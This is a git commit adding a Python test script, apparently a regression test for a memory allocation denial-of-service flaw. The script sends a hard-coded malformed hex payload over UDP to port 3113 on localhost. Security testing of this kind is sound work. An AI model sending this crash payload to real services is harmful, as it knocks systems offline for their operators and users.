1eb256dd6bf3a0f8b40e85cd8427f4a396e0836c
Nate Richard <nrichard@jpl.nasa.gov>
2025-10-08 14:58:05 -0700

    Add test for memory allocation vuln

---
+++ tests/memory_allocation_dos/corruption_send.py
@@ -0,0 +1,7 @@
+import binascii
+import socket
+
+bad_payload = "9f88070000820282020182028201018202820100821b000100bb0e20b4ea001a000927c085070201005bbb0e20b4ea001a000927c085070201005b0086010100014d480086010100014d48656c6c6f2c756433746e2d686f54"
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(binascii.unhexlify(bad_payload), ('127.0.0.1', 3113))
